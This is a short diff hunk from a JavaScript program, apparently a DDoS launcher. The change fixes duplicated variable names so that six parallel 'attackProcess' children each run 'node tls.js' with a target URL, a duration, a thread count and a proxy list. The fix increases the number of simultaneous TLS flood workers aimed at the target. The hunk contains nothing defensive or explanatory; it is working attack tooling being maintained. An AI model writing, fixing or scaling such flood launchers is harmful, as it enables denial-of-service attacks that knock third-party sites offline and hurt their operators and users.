@@ -158,8 +158,8 @@ async function main() {
     const attackProcess2 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
     const attackProcess3 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
     const attackProcess4 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
-    const attackProcess3 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
-    const attackProcess4 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
+    const attackProcess5 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
+    const attackProcess6 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
     
     // Attach event listeners for each process
     attackProcess1.stdout.on('data', (data) => {
